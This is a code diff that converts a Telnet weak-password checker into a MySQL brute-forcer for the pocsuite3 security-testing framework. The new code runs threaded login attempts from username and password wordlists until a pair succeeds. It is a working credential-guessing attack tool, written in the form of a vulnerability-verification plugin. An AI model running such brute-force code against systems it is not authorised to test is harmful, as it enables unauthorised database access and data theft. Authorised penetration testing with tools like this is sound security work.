@@ -1,42 +1,54 @@
-"""
-If you have issues about development, please read:
-https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
-"""
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @File : mysql_burst.py
+# @Author : Norah C.IV
+# @Time : 2022/4/24 15:56
+# @Software: PyCharm
+import MySQLdb
 import itertools
 import queue
 import socket
-import telnetlib
 
-from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
+from collections import OrderedDict
+from pocsuite3.api import POCBase, Output, register_poc, POC_CATEGORY, VUL_TYPE, logger
 from pocsuite3.lib.core.data import paths
+from pocsuite3.lib.core.interpreter_option import OptInteger
 from pocsuite3.lib.core.threads import run_threads
 
 
 class DemoPOC(POCBase):
-    vulID = '89687'
-    version = '3'
-    author = ['seebug']
-    vulDate = '2018-09-19'
-    createDate = '2018-09-19'
-    updateDate = '2018-09-19'
-    references = ['https://www.seebug.org/vuldb/ssvid-89687']
-    name = 'Telnet 弱密码'
+    vulID = '1'
+    version = '1'
+    author = ['Norah C.IV']
+    vulDate = '2022-04-24'
+    createDate = '2022-04-24'
+    updateDate = '2022-04-24'
+    references = ['']
+    name = 'MYSQL 弱密码'
     appPowerLink = ''
-    appName = 'telnet'
+    appName = 'MySQL'
     appVersion = 'All'
     vulType = VUL_TYPE.WEAK_PASSWORD
-    desc = '''telnet 存在弱密码，导致攻击者可登录主机进行恶意操作'''
+    desc = '''mysql 存在弱密码，攻击者可连接主机进行操作，导致数据泄露'''
     samples = ['']
+    install_requires = ['']
     category = POC_CATEGORY.TOOLS.CRACK
-    protocol = POC_CATEGORY.PROTOCOL.TELENT
+    protocol = POC_CATEGORY.PROTOCOL.MYSQL
+
+    def _options(self):
+        o = OrderedDict()
+        o["mysql_burst_threads"] = OptInteger(4, description='set mysql_burst_threads', require=False)
+        return o
 
     def _verify(self):
         result = {}
         host = self.getg_option("rhost")
-        port = self.getg_option("rport") or 23
+        port = self.getg_option("rport") or 3306
+        mysql_burst_threads = self.get_option("mysql_burst_threads")
 
-        telnet_burst(host, port)
+        task_queue = queue.Queue()
+        result_queue = queue.Queue()
+        mysql_burst(host, port, task_queue, result_queue, mysql_burst_threads)
         if not result_queue.empty():
             username, password = result_queue.get()
             result['VerifyInfo'] = {}
@@ -59,17 +71,13 @@ class DemoPOC(POCBase):
         return output
 
 
-task_queue = queue.Queue()
-result_queue = queue.Queue()
-
-
 def get_word_list():
-    with open(paths.TELNET_USER) as username:
-        with open(paths.TELNET_PASS) as password:
+    with open(paths.MYSQL_USER) as username:
+        with open(paths.MYSQL_PASS) as password:
             return itertools.product(username, password)
 
 
-def port_check(host, port=23):
+def port_check(host, port=3306):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect_ex((host, int(port)))
     if connect == 0:
@@ -79,58 +87,39 @@ def port_check(host, port=23):
         return False
 
 
-def telnet_login(host, port, username, password):
+def mysql_login(host, port, username, password):
     ret = False
-    key = [b'>', b'Login', b'login']
-    tn = None
     try:
-        for wrap in [b'\n', b'\r\n']:
-            tn = telnetlib.Telnet()
-            tn.open(host, port, timeout=6)
-            tn.read_until(b'login: ', timeout=3)
-            tn.write(username.encode() + wrap)
-            if password:
-                tn.read_until(b'password: ', timeout=3)
-                tn.write(password.encode() + wrap)
-            tmp = tn.expect(key, timeout=3)
-            if b'>' in tmp[2]:
-                ret = True
-                break
+        MySQLdb.connect(host=host, port=port, user=username, passwd=password)
+        ret = True
     except Exception:
         pass
-    finally:
-        if tn:
-            tn.close()
     return ret
 
 
-def task_init(host, port):
-    tmp = set()
+def task_init(host, port, task_queue, result_queue):
     for username, password in get_word_list():
-        if username not in tmp:
-            task_queue.put((host, port, username.strip(), ''))
-            tmp.add(username)
         task_queue.put((host, port, username.strip(), password.strip()))
 
 
-def task_thread():
+def task_thread(task_queue, result_queue):
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
         # logger.info('try burst {}:{} use username:{} password:{}'.format(
         #     host, port, username, password))
-        if telnet_login(host, port, username, password):
+        if mysql_login(host, port, username, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
             result_queue.put((username, password))
 
 
-def telnet_burst(host, port):
+def mysql_burst(host, port, task_queue, result_queue, mysql_burst_threads):
     if not port_check(host, port):
+        logger.warning("{}:{} is unreachable".format(host, port))
         return
-
     try:
-        task_init(host, port)
-        run_threads(4, task_thread)
+        task_init(host, port, task_queue, result_queue)
+        run_threads(mysql_burst_threads, task_thread, args=(task_queue, result_queue))
     except Exception:
         pass
 
